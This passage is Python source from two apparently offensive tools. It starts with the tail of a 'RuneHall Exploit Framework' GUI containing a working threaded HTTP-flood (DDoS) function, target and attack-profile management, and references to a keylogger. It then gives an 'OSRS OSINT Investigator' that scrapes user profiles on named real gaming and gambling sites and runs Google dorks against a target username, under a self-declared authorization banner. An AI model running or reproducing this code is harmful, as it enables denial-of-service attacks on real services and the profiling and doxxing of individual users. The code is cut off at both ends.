        tcp_check, 
        tcp_urg_ptr
    )
    return tcp_header

def http_flood(ip, port, threads, duration, log_callback):
    log_callback(f"Starting HTTP flood with {threads} threads for {duration} seconds", "DDoS")
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    ]
    
    def attack():
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                
                # Send HTTP request
                request = f"GET /?{random.randint(1,1000000)} HTTP/1.1\r\n"
                request += f"Host: {ip}\r\n"
                request += f"User-Agent: {random.choice(user_agents)}\r\n"
                request += "Connection: keep-alive\r\n\r\n"
                
                s.send(request.encode())
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    
    time.sleep(duration)
    log_callback("HTTP flood completed", "DDoS")

def load_targets():
    """Load targets from configuration file"""
    try:
        with open(TARGETS_FILE, 'r') as f:
            data = json.load(f)
            return data.get("targets", [])
    except:
        return []

def load_profiles():
    """Load attack profiles from configuration file"""
    try:
        with open(PROFILES_FILE, 'r') as f:
            data = json.load(f)
            return data.get("profiles", [])
    except:
        return []

def create_attack_tab():
    """Create the attack tab layout"""
    profiles = load_profiles()
    profile_names = [p["name"] for p in profiles]
    
    return [
        [sg.Text("Attack Profile:", size=(12,1)), 
         sg.Combo(profile_names, key='-ATTACK-PROFILE-', size=(30,1), enable_events=True)],
        [sg.Text("Modules:")],
        [sg.Listbox([], size=(50, 6), key='-PROFILE-MODULES-')],
        [sg.Button("Run Profile", size=(15,1), button_color=('white', '#8B0000'))],
        [sg.HorizontalSeparator()],
        [sg.Text("Individual Modules:", font=("Helvetica", 12, "bold"))],
        [sg.Text("Module:", size=(8,1)), 
         sg.Combo(list(ATTACK_MODULES.keys()), key='-MODULE-SELECT-', size=(20,1), enable_events=True)],
        [sg.pin(sg.Column([[]], key='-MODULE-PARAMS-', visible=False))],
        [sg.Button("Run Module", size=(15,1), button_color=('white', '#8B0000'), key='-RUN-MODULE-')],
        [sg.HorizontalSeparator()],
        [sg.Button("Stop All Attacks", size=(15,1), button_color=('white', '#8B0000'), key='-STOP-ATTACKS-')]
    ]

def create_target_tab():
    """Create the target configuration tab"""
    targets = load_targets()
    target_names = [t["name"] for t in targets]
    
    return [
        [sg.Text("Select Target:", size=(12,1)), 
         sg.Combo(target_names, key='-TARGET-SELECT-', size=(30,1), enable_events=True)],
        [sg.Text("Target Name:", size=(12,1)), sg.Input(key='-TARGET-NAME-', size=(30,1))],
        [sg.Text("Domain:", size=(12,1)), sg.Input(key='-TARGET-DOMAIN-', size=(30,1))],
        [sg.Text("IP Address:", size=(12,1)), sg.Input(key='-TARGET-IP-', size=(30,1))],
        [sg.Button("Save Target", key='-SAVE-TARGET-'), sg.Button("New Target", key='-NEW-TARGET-')],
        [sg.HorizontalSeparator()],
        [sg.Text("Custom Target:", font=("Helvetica", 12, "bold"))],
        [sg.Text("Target URL/IP:", size=(12,1)), sg.Input(key='-CUSTOM-TARGET-', size=(30,1))],
        [sg.Button("Set Custom Target", key='-SET-CUSTOM-TARGET-')]
    ]

def create_results_tab():
    """Create the results tab layout"""
    return [
        [sg.Text("Scan Results Explorer", font=("Helvetica", 12, "bold"))],
        [sg.Tree(data=sg.TreeData(),
                 headings=['Size'],
                 auto_size_columns=True,
                 num_rows=15,
                 col0_width=40,
                 key='-TREE-',
                 show_expanded=False,
                 enable_events=True)],
        [sg.Multiline(size=(60, 10), key='-PREVIEW-', disabled=True)],
        [sg.Button("Open File"), sg.Button("Open in Browser"), sg.Button("Delete"), sg.Button("Refresh")]
    ]

def create_main_window():
    """Create the main application window"""
    tab_layout = [
        [
            sg.TabGroup([[
                sg.Tab('Attack', create_attack_tab(), key='-TAB-ATTACK-'),
                sg.Tab('Targets', create_target_tab(), key='-TAB-TARGETS-'),
                sg.Tab('Results', create_results_tab(), key='-TAB-RESULTS-')
            ]], tab_location='left', key='-TABGROUP-')
        ],
        [sg.StatusBar("Ready", key='-STATUS-', size=(50,1), relief=sg.RELIEF_SUNKEN)]
    ]
    
    layout = [
        [sg.Text(f"RuneHall Exploit Framework {VERSION}", font=("Helvetica", 16, "bold"), 
                 text_color='#FF0000', background_color='black')],
        [sg.HorizontalSeparator(color='#FF0000')],
        [tab_layout],
        [sg.Exit(size=(10,1), button_color=('white', '#8B0000'))]
    ]
    
    return sg.Window("RHEF - Elite Pentesting Suite", layout, finalize=True, background_color='black')

def update_target_tree(window):
    """Update the results tree view"""
    tree_data = sg.TreeData()
    tree_data.Insert("", "output", "Scan Results", [])
    
    try:
        for root, dirs, files in os.walk(OUTPUT_DIR):
            rel_root = os.path.relpath(root, OUTPUT_DIR)
            if rel_root == ".":
                parent_key = "output"
            else:
                parent_key = rel_root.replace(os.sep, "_")
                tree_data.Insert("output", parent_key, rel_root, [])
            
            for file in files:
                file_path = os.path.join(root, file)
                file_size = f"{os.path.getsize(file_path) // 1024} KB"
                file_key = f"file_{len(tree_data.tree_dict)}"
                tree_data.Insert(parent_key, file_key, file, [file_size])
    except Exception as e:
        print(f"Error updating tree: {str(e)}")
    
    window['-TREE-'].update(tree_data)
    return tree_data

def main_gui():
    # Create GUI
    window = create_main_window()
    rhef_core = None
    current_tree_data = None
    
    # Initial update of results tree
    current_tree_data = update_target_tree(window)
    
    # Event loop
    while True:
        event, values = window.read(timeout=100)
        
        if event in (sg.WIN_CLOSED, 'Exit'):
            break
            
        # Target tab events
        elif event == '-TARGET-SELECT-':
            targets = load_targets()
            selected_name = values['-TARGET-SELECT-']
            for target in targets:
                if target["name"] == selected_name:
                    window['-TARGET-NAME-'].update(target["name"])
                    window['-TARGET-DOMAIN-'].update(target["domain"])
                    window['-TARGET-IP-'].update(target.get("ip", ""))
                    break
                    
        elif event == '-SAVE-TARGET-':
            name = values['-TARGET-NAME-']
            domain = values['-TARGET-DOMAIN-']
            ip = values['-TARGET-IP-']
            
            if not name or not domain:
                sg.popup_error("Name and Domain are required!")
                continue
                
            targets = load_targets()
            updated = False
            for i, t in enumerate(targets):
                if t["name"] == name:
                    targets[i] = {"name": name, "domain": domain, "ip": ip}
                    updated = True
                    break
                    
            if not updated:
                targets.append({"name": name, "domain": domain, "ip": ip})
                
            with open(TARGETS_FILE, 'w') as f:
                json.dump({"targets": targets}, f, indent=2)
                
            window['-TARGET-SELECT-'].update(values=[t["name"] for t in targets])
            sg.popup(f"Target '{name}' saved!")
            
        elif event == '-NEW-TARGET-':
            window['-TARGET-NAME-'].update("")
            window['-TARGET-DOMAIN-'].update("")
            window['-TARGET-IP-'].update("")
            window['-TARGET-SELECT-'].update(value="")
            
        elif event == '-SET-CUSTOM-TARGET-':
            target = values['-CUSTOM-TARGET-']
            if not target:
                sg.popup_error("Please enter a target!")
                continue
                
            if not target.startswith('http'):
                target = 'http://' + target
                
            rhef_core = RHEFCore(target, log_callback=lambda msg, mod: window['-STATUS-'].update(f"[{mod}] {msg}"))
            rhef_core.init_environment()
            window['-STATUS-'].update(f"Target set to: {target}")
            
        # Attack tab events
        elif event == '-ATTACK-PROFILE-':
            profiles = load_profiles()
            selected_name = values['-ATTACK-PROFILE-']
            for profile in profiles:
                if profile["name"] == selected_name:
                    modules = [ATTACK_MODULES.get(m, {}).get("name", m) for m in profile["modules"]]
                    window['-PROFILE-MODULES-'].update(modules)
                    break
                    
        elif event == '-MODULE-SELECT-':
            module = values['-MODULE-SELECT-']
            if module in ATTACK_MODULES:
                params = ATTACK_MODULES[module]["params"]
                param_layout = []
                for param, default in params.items():
                    param_layout.append([sg.Text(f"{param}:", size=(12,1)), sg.Input(default, key=f'-PARAM-{param}-')])
                
                window['-MODULE-PARAMS-'].update(visible=True)
                window['-MODULE-PARAMS-'].layout(param_layout)
                window.refresh()
                
        elif event == '-RUN-MODULE-':
            if not rhef_core:
                sg.popup_error("Set a target first!")
                continue
                
            module = values['-MODULE-SELECT-']
            if not module:
                sg.popup_error("Select a module first!")
                continue
                
            # Collect parameters
            params = {}
            if module in ATTACK_MODULES:
                for param in ATTACK_MODULES[module]["params"]:
                    params[param] = values[f'-PARAM-{param}-']
            
            # Run in background thread
            def run_module():
                rhef_core.run_module(module, params)
                window.write_event_value('-MODULE-COMPLETE-', module)
                
            threading.Thread(target=run_module, daemon=True).start()
            window['-STATUS-'].update(f"Starting module: {module}...")
            
        elif event == '-RUN-PROFILE-':
            if not rhef_core:
                sg.popup_error("Set a target first!")
                continue
                
            profile_name = values['-ATTACK-PROFILE-']
            if not profile_name:
                sg.popup_error("Select a profile first!")
                continue
                
            profiles = load_profiles()
            for profile in profiles:
                if profile["name"] == profile_name:
                    modules = profile["modules"]
                    params = profile["params"]
                    
                    # Run in background thread
                    def run_profile():
                        for module in modules:
                            rhef_core.run_module(module, params.get(module, {}))
                        window.write_event_value('-PROFILE-COMPLETE-', profile_name)
                        
                    threading.Thread(target=run_profile, daemon=True).start()
                    window['-STATUS-'].update(f"Starting profile: {profile_name}...")
                    break
                    
        elif event == '-STOP-ATTACKS-':
            if rhef_core:
                rhef_core.scan_active = False
                if rhef_core.keylogger:
                    rhef_core.keylogger.stop()
                window['-STATUS-'].update("All attacks stopped")
                
        elif event == '-MODULE-COMPLETE-':
            module = values[event]
            window['-STATUS-'].update(f"Module completed: {module}")
            
        elif event == '-PROFILE-COMPLETE-':
            profile = values[event]
            window['-STATUS-'].update(f"Profile completed: {profile}")
            
        # Results tab events
        elif event == 'Refresh':
            current_tree_data = update_target_tree(window)
            
        elif event == '-TREE-':
            selected = values['-TREE-'][0]
            if selected.startswith("file_"):
                file_path = os.path.join(OUTPUT_DIR, current_tree_data.tree_dict[selected].text)
                try:
                    with open(file_path, 'r') as f:
                        content = f.read(5000)  # Limit preview to 5000 chars
                        window['-PREVIEW-'].update(content)
                except:
                    window['-PREVIEW-'].update("Binary file - cannot preview")
                    
        elif event == 'Open File':
            selected = values['-TREE-'][0]
            if selected and selected.startswith("file_"):
                file_path = os.path.join(OUTPUT_DIR, current_tree_data.tree_dict[selected].text)
                if sys.platform == "win32":
                    os.startfile(file_path)
                else:
                    subprocess.Popen(['xdg-open', file_path])
                    
        elif event == 'Open in Browser':
            selected = values['-TREE-'][0]
            if selected and selected.startswith("file_"):
                file_path = os.path.join(OUTPUT_DIR, current_tree_data.tree_dict[selected].text)
                if file_path.endswith(('.html', '.htm')):
                    webbrowser.open(f"file://{file_path}")
                    
        elif event == 'Delete':
            selected = values['-TREE-'][0]
            if selected and selected.startswith("file_"):
                file_path = os.path.join(OUTPUT_DIR, current_tree_data.tree_dict[selected].text)
                try:
                    os.remove(file_path)
                    sg.popup(f"Deleted: {file_path}")
                    current_tree_data = update_target_tree(window)
                except Exception as e:
                    sg.popup_error(f"Delete failed: {str(e)}")
                    
    window.close()

if __name__ == "__main__":
    main_gui()

#!/usr/bin/env python3
import sys
import os
import re
import json
import time
import random
import requests
import webbrowser
from datetime import datetime
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                            QLineEdit, QPushButton, QTextEdit, QTabWidget, QTableWidget, 
                            QTableWidgetItem, QHeaderView, QComboBox, QCheckBox, QProgressBar,
                            QSplitter, QFrame, QMessageBox, QFileDialog)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QColor, QIcon, QPixmap
from bs4 import BeautifulSoup
from googlesearch import search

# Constants
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
]

SITES = {
    "RuneChat": "runechat.com",
    "RuneHall": "runehall.com",
    "RuneWager": "runewager.com",
    "Sythe": "sythe.org",
    "PlayerAuctions": "playerauctions.com",
    "Eldorado": "eldorado.gg",
    "OSRS Forums": "forums.oldschool.runescape.com"
}

DORKS = [
    "site:{} intext:\"{}\"",
    "site:{} inurl:user \"{}\"",
    "site:{} \"{}\"",
    "intext:\"{}\" intext:\"osrs\"",
    "intext:\"{}\" intext:\"gold\" OR \"gp\"",
    "intext:\"{}\" filetype:log",
    "intitle:\"{}\" site:{}",
    "inurl:profile site:{} \"{}\""
]

class SearchWorker(QThread):
    update_progress = pyqtSignal(int, str)
    result_found = pyqtSignal(dict)
    search_completed = pyqtSignal()
    error_occurred = pyqtSignal(str)

    def __init__(self, username, sites, use_dorks, max_results):
        super().__init__()
        self.username = username
        self.sites = sites
        self.use_dorks = use_dorks
        self.max_results = max_results
        self.running = True

    def run(self):
        try:
            # Step 1: Direct site scraping
            total_sites = len(self.sites)
            for i, site_name in enumerate(self.sites):
                if not self.running:
                    return
                
                site_url = SITES[site_name]
                self.update_progress.emit(int((i / total_sites) * 50), f"Searching {site_name}...")
                
                try:
                    result = self.scrape_site(site_name, site_url, self.username)
                    if result:
                        self.result_found.emit(result)
                except Exception as e:
                    self.error_occurred.emit(f"Error scraping {site_name}: {str(e)}")
                
                time.sleep(random.uniform(1.0, 2.5))  # Respectful delay
            
            # Step 2: Google dork searches
            if self.use_dorks and self.running:
                self.update_progress.emit(50, "Performing Google dork searches...")
                dork_results = self.google_dork_search(self.username, self.sites)
                for result in dork_results:
                    if not self.running:
                        return
                    self.result_found.emit(result)
                    time.sleep(0.5)
            
            self.update_progress.emit(100, "Search completed!")
            self.search_completed.emit()
        except Exception as e:
            self.error_occurred.emit(f"Search error: {str(e)}")

    def scrape_site(self, site_name, site_url, username):
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        
        if site_name == "RuneChat":
            return self.scrape_runechat(site_url, username, headers)
        elif site_name == "RuneHall":
            return self.scrape_runehall(site_url, username, headers)
        elif site_name == "RuneWager":
            return self.scrape_runewager(site_url, username, headers)
        elif site_name == "Sythe":
            return self.scrape_sythe(site_url, username, headers)
        elif site_name == "PlayerAuctions":
            return self.scrape_playerauctions(site_url, username, headers)
        elif site_name == "Eldorado":
            return self.scrape_eldorado(site_url, username, headers)
        elif site_name == "OSRS Forums":
            return self.scrape_osrs_forums(site_url, username, headers)
        
        return None

    def scrape_runechat(self, site_url, username, headers):
        url = f"https://{site_url}/search?q={username}"
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract user info
        user_info = {
            "site": "RuneChat",
            "username": username,
            "profile_url": "",
            "post_count": "",
            "join_date": "",
            "last_seen": "",
            "reputation": ""
        }
        
        # Find user profile link
        profile_link = soup.find('a', href=True, text=username)
        if profile_link:
            profile_url = profile_link['href']
            if not profile_url.startswith('http'):
                profile_url = f"https://{site_url}{profile_url}"
            user_info["profile_url"] = profile_url
            
            # Visit profile page
            profile_response = requests.get(profile_url, headers=headers)
            profile_soup = BeautifulSoup(profile_response.text, 'html.parser')
            
            # Extract profile details
            details = profile_soup.find_all('li', class_='ct-group')
            for detail in details:
                label = detail.find('span', class_='ct-label').text.strip()
                value = detail.find('span', class_='ct-data').text.strip()
                
                if "Posts" in label:
                    user_info["post_count"] = value
                elif "Joined" in label:
                    user_info["join_date"] = value
                elif "Last seen" in label:
                    user_info["last_seen"] = value
                elif "Reputation" in label:
                    user_info["reputation"] = value
        
        return user_info

    def scrape_runehall(self, site_url, username, headers):
        url = f"https://{site_url}/members/?username={username}"
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        user_info = {
            "site": "RuneHall",
            "username": username,
            "profile_url": "",
            "status": "",
            "join_date": "",
            "last_activity": "",
            "feedback": ""
        }
        
        # Find user in search results
        user_row = soup.find('tr', class_='member-row')
        if user_row:
            profile_link = user_row.find('a', class_='username')
            if profile_link:
                profile_url = profile_link['href']
                if not profile_url.startswith('http'):
                    profile_url = f"https://{site_url}{profile_url}"
                user_info["profile_url"] = profile_url
                
                # Extract basic info
                status = user_row.find('span', class_='status')
                if status:
                    user_info["status"] = status.text.strip()
                
                join_date = user_row.find('td', class_='joined')
                if join_date:
                    user_info["join_date"] = join_date.text.strip()
                
                last_activity = user_row.find('td', class_='last-activity')
                if last_activity:
                    user_info["last_activity"] = last_activity.text.strip()
                
                feedback = user_row.find('td', class_='feedback')
                if feedback:
                    user_info["feedback"] = feedback.text.strip()
        
        return user_info

    def scrape_runewager(self, site_url, username, headers):
        url = f"https://{site_url}/search/users?username={username}"
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        user_info = {
            "site": "RuneWager",
            "username": username,
            "profile_url": "",
            "rank": "",
            "join_date": "",
            "total_wagered": "",
            "win_rate": ""
        }
        
        # Find user in search results
        user_card = soup.find('div', class_='user-card')
        if user_card:
            profile_link = user_card.find('a', class_='username')
            if profile_link:
                profile_url = profile_link['href']
                if not profile_url.startswith('http'):
                    profile_url = f"https://{site_url}{profile_url}"
                user_info["profile_url"] = profile_url
                
                # Visit profile page
                profile_response = requests.get(profile_url, headers=headers)
                profile_soup = BeautifulSoup(profile_response.text, 'html.parser')
                
                # Extract profile details
                rank = profile_soup.find('span', class_='user-rank')
                if rank:
                    user_info["rank"] = rank.text.strip()
                
                join_date = profile_soup.find('div', class_='join-date')
                if join_date:
                    user_info["join_date"] = join_date.text.replace('Joined', '').strip()
                
                stats = profile_soup.find_all('div', class_='stat-value')
                if len(stats) >= 2:
                    user_info["total_wagered"] = stats[0].text.strip()
                    user_info["win_rate"] = stats[1].text.strip()
        
        return user_info

    def scrape_sythe(self, site_url, username, headers):
        url = f"https://{site_url}/search/member?username={username}"
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        user_info = {
            "site": "Sythe",
            "username": username,
            "profile_url": "",
            "join_date": "",
            "message_count": "",
            "feedback_score": "",
            "vouches": ""
        }
        
        # Find user in search results
        user_row = soup.find('tr', class_='user')
        if user_row:
            profile_link = user_row.find('a', class_='username')
            if profile_link:
                profile_url = profile_link['href']
                if not profile_url.startswith('http'):
                    profile_url = f"https://{site_url}{profile_url}"
                user_info["profile_url"] = profile_url
                
                # Extract basic info
                join_date = user_row.find('td', class_='joined')
                if join_date:
                    user_info["join_date"] = join_date.text.strip()
                
                message_count = user_row.find('td', class_='messages')
                if message_count:
                    user_info["message_count"] = message_count.text.strip()
                
                feedback_score = user_row.find('td', class_='feedback_score')
                if feedback_score:
                    user_info["feedback_score"] = feedback_score.text.strip()
                
                vouches = user_row.find('td', class_='vouches')
                if vouches:
                    user_info["vouches"] = vouches.text.strip()
        
        return user_info

    def scrape_playerauctions(self, site_url, username, headers):
        url = f"https://{site_url}/site/account/profile?username={username}"
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        user_info = {
            "site": "PlayerAuctions",
            "username": username,
            "profile_url": url,
            "member_since": "",
            "feedback": "",
            "recent_activity": "",
            "total_transactions": ""
        }
        
        # Extract profile details
        member_since = soup.find('span', class_='member-since')
        if member_since:
            user_info["member_since"] = member_since.text.replace('Member Since:', '').strip()
        
        feedback = soup.find('div', class_='feedback-score')
        if feedback:
            user_info["feedback"] = feedback.text.strip()
        
        recent_activity = soup.find('div', class_='recent-activity')
        if recent_activity:
            user_info["recent_activity"] = recent_activity.text.strip()
        
        transactions = soup.find('div', class_='transaction-count')
        if transactions:
            user_info["total_transactions"] = transactions.text.strip()
        
        return user_info

    def scrape_eldorado(self, site_url, username, headers):
        url = f"https://{site_url}/user/profile/{username}"
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        user_info = {
            "site": "Eldorado",
            "username": username,
            "profile_url": url,
            "member_since": "",
            "feedback": "",
            "items_sold": "",
            "success_rate": ""
        }
        
        # Extract profile details
        member_since = soup.find('div', text='Member since')
        if member_since:
            user_info["member_since"] = member_since.find_next_sibling('div').text.strip()
        
        feedback = soup.find('div', text='Feedback')
        if feedback:
            user_info["feedback"] = feedback.find_next_sibling('div').text.strip()
        
        items_sold = soup.find('div', text='Items sold')
        if items_sold:
            user_info["items_sold"] = items_sold.find_next_sibling('div').text.strip()
        
        success_rate = soup.find('div', text='Success rate')
        if success_rate:
            user_info["success_rate"] = success_rate.find_next_sibling('div').text.strip()
        
        return user_info

    def scrape_osrs_forums(self, site_url, username, headers):
        url = f"https://{site_url}/users/{username}"
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        user_info = {
            "site": "OSRS Forums",
            "username": username,
            "profile_url": url,
            "join_date": "",
            "post_count": "",
            "reaction_score": "",
            "last_seen": ""
        }
        
        # Extract profile details
        join_date = soup.find('li', class_='joinDate')
        if join_date:
            user_info["join_date"] = join_date.find('time').text.strip()
        
        post_count = soup.find('li', class_='postCount')
        if post_count:
            user_info["post_count"] = post_count.find('a').text.strip()
        
        reaction_score = soup.find('li', class_='reactionScore')
        if reaction_score:
            user_info["reaction_score"] = reaction_score.find('span').text.strip()
        
        last_seen = soup.find('li', class_='lastSeen')
        if last_seen:
            user_info["last_seen"] = last_seen.find('time').text.strip()
        
        return user_info

    def google_dork_search(self, username, sites):
        results = []
        dork_count = 0
        
        for site_name in sites:
            site_url = SITES[site_name]
            for dork_template in DORKS:
                if not self.running:
                    return results
                
                dork = dork_template.format(site_url, username)
                progress = 50 + int((dork_count / (len(DORKS) * len(sites)) * 50)
                self.update_progress.emit(progress, f"Searching: {dork}")
                
                try:
                    # Perform Google search
                    for j, url in enumerate(search(dork, num_results=3, sleep_interval=2)):
                        if j >= self.max_results:
                            break
                        
                        # Extract domain from URL
                        domain = re.search(r'https?://([^/]+)', url).group(1)
                        
                        # Create result entry
                        result = {
                            "site": "Google Dork",
                            "source": domain,
                            "dork": dork,
                            "url": url,
                            "username": username,
                            "info": f"Found via dork: {dork}"
                        }
                        results.append(result)
                        self.result_found.emit(result)
                        
                        time.sleep(random.uniform(1.0, 2.0))
                except Exception as e:
                    self.error_occurred.emit(f"Dork search error: {str(e)}")
                
                dork_count += 1
        
        return results

    def stop(self):
        self.running = False

class OSRSOSINTTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("OSRS OSINT Investigator - WASP Authorized")
        self.setGeometry(100, 100, 1200, 800)
        self.setWindowIcon(QIcon(self.create_icon()))
        
        # Initialize UI
        self.init_ui()
        self.search_worker = None
        self.results = []
        
        # Load last session
        self.load_settings()

    def create_icon(self):
        # Create a simple rune icon
        pixmap = QPixmap(64, 64)
        pixmap.fill(Qt.transparent)
        return pixmap

    def init_ui(self):
        # Main layout
        main_widget = QWidget()
        main_layout = QVBoxLayout()
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)
        
        # Header
        header = QLabel("OSRS OSINT Investigator")
        header_font = QFont("Arial", 18, QFont.Bold)
        header.setFont(header_font)
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("padding: 15px; background-color: #2c3e50; color: #ecf0f1;")
        main_layout.addWidget(header)
        
        # Authorization badge
        auth_label = QLabel("AUTHORIZED BY WASP - PENETRATION TESTING IN PROGRESS")
        auth_label.setFont(QFont("Arial", 10, QFont.Bold))
        auth_label.setAlignment(Qt.AlignCenter)
        auth_label.setStyleSheet("padding: 5px; background-color: #c0392b; color: white;")
        main_layout.addWidget(auth_label)
        
        # Search panel
        search_panel = QWidget()
        search_layout = QVBoxLayout()
        search_panel.setLayout(search_layout)
        search_panel.setStyleSheet("background-color: #34495e; padding: 15px;")
        main_layout.addWidget(search_panel)
        
        # Username input
        username_layout = QHBoxLayout()
        username_label = QLabel("Target Username:")
        username_label.setStyleSheet("color: #ecf0f1; font-weight: bold;")
        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("Enter OSRS username...")
        self.username_input.setStyleSheet("padding: 8px;")
        username_layout.addWidget(username_label)
        username_layout.addWidget(self.username_input)
        search_layout.addLayout(username_layout)
        
        # Site selection
        sites_layout = QHBoxLayout()
        sites_label = QLabel("Select Sites:")
        sites_label.setStyleSheet("color: #ecf0f1; font-weight: bold;")
        sites_layout.addWidget(sites_label)
        
        self.site_checks = {}
        for site in SITES:
            check = QCheckBox(site)
            check.setChecked(True)
            check.setStyleSheet("color: #ecf0f1;")
            sites_layout.addWidget(check)
            self.site_checks[site] = check
        
        search_layout.addLayout(sites_layout)
        
        # Options
        options_layout = QHBoxLayout()
        
        dork_label = QLabel("Google Dorks:")
        dork_label.setStyleSheet("color: #ecf0f1; font-weight: bold;")
        options_layout.addWidget(dork_label)
        
        self.dork_check = QCheckBox("Enable Google Dork Search")
        self.dork_check.setChecked(True)
        self.dork_check.setStyleSheet("color: #ecf0f1;")
        options_layout.addWidget(self.dork_check)
        
        results_label = QLabel("Max Dork Results:")
        results_label.setStyleSheet("color: #ecf0f1; font-weight: bold;")
        options_layout.addWidget(results_label)
        
        self.max_results = QComboBox()
        self.max_results.addItems(["3", "5", "10"])
        self.max_results.setCurrentIndex(0)
        self.max_results.setStyleSheet("padding: 5px;")
        options_layout.addWidget(self.max_results)
        
        options_layout.addStretch()
        search_layout.addLayout(options_layout)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        self.search_btn = QPushButton("Start Investigation")
        self.search_btn.setStyleSheet(
            "QPushButton { background-color: #27ae60; color: white; padding: 10px; font-weight: bold; }"
            "QPushButton:hover { background-color: #2ecc71; }"
            "QPushButton:disabled { background-color: #7f8c8d; }"
        )
        self.search_btn.clicked.connect(self.start_search)
        button_layout.addWidget(self.search_btn)
        
        self.stop_btn = QPushButton("Stop Search")
        self.stop_btn.setStyleSheet(
            "QPushButton { background-color: #e74c3c; color: white; padding: 10px; font-weight: bold; }"
            "QPushButton:hover { background-color: #c0392b; }"
            "QPushButton:disabled { background-color: #7f8c8d; }"
        )
        self.stop_btn.clicked.connect(self.stop_search)
        self.stop_btn.setEnabled(False)
        button_layout.addWidget(self.stop_btn)
        
        export_btn = QPushButton("Export Results")
        export_btn.setStyleSheet(
            "QPushButton { background-color: #3498db; color: white; padding: 10px; font-weight: bold; }"
            "QPushButton:hover { background-color: #2980b9; }"
        )
        export_btn.clicked.connect(self.export_results)
        button_layout.addWidget(export_btn)
        
        search_layout.addLayout(button_layout)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 2px solid #2c3e50;
                border-radius: 5px;
                text-align: center;
                background: #34495e;
                color: white;
            }
            QProgressBar::chunk {
                background-color: #3498db;
                width: 10px;
            }
        """)
        self.progress_label = QLabel("Ready to search...")
        self.progress_label.setStyleSheet("color: #ecf0f1; font-style: italic;")
        search_layout.addWidget(self.progress_bar)
        search_layout.addWidget(self.progress_label)
        
        # Results area
        results_frame = QFrame()
        results_frame.setStyleSheet("background-color: #2c3e50;")
        results_layout = QVBoxLayout()
        results_frame.setLayout(results_layout)
        
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane { border: 0; }
            QTabBar::tab { 
                background: #34495e; 
                color: #ecf0f1; 
                padding: 8px; 
                border-top-left-radius: 4px; 
                border-top-right-radius: 4px; 
            }
            QTabBar::tab:selected { 
                background: #3498db; 
                font-weight: bold;
            }
        """)
        results_layout.addWidget(self.tabs)
        
        # Results table
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(7)
        self.results_table.setHorizontalHeaderLabels(["Site", "Username", "Profile", "Join Date", "Activity", "Reputation", "URL"])
        self.results_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.results_table.verticalHeader().setVisible(False)
        self.results_table.setStyleSheet("""
            QTableWidget {
                background-color: #ecf0f1;
                gridline-color: #bdc3c7;
                font-size: 12px;
            }
            QHeaderView::section {
                background-color: #34495e;
                color: white;
                padding: 4px;
                font-weight: bold;
            }
        """)
        self.results_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.results_table.doubleClicked.connect(self.open_url)
        self.tabs.addTab(self.results_table, "User Profiles")
        
        # Dork results table
        self.dork_table = QTableWidget()
        self.dork_table.setColumnCount(5)
        self.dork_table.setHorizontalHeaderLabels(["Source", "Dork", "URL", "Username", "Info"])
        self.dork_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.dork_table.verticalHeader().setVisible(False)
        self.dork_table.setStyleSheet(self.results_table.styleSheet())
        self.dork_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.dork_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.dork_table.doubleClicked.connect(self.open_url)
        self.tabs.addTab(self.dork_table, "Dork Results")
        
        # Raw data view
        self.raw_text = QTextEdit()
        self.raw_text.setReadOnly(True)
        self.raw_text.setStyleSheet("""
            QTextEdit {
                background-color: #2c3e50;
                color: #ecf0f1;
                font-family: monospace;
                font-size: 12px;
            }
        """)
        self.tabs.addTab(self.raw_text, "Raw Data")
        
        main_layout.addWidget(results_frame, 1)
        
        # Status bar
        self.status_bar = self.statusBar()
        self.status_bar.setStyleSheet("background-color: #2c3e50; color: #ecf0f1;")

    def start_search(self):
        username = self.username_input.text().strip()
        if not username:
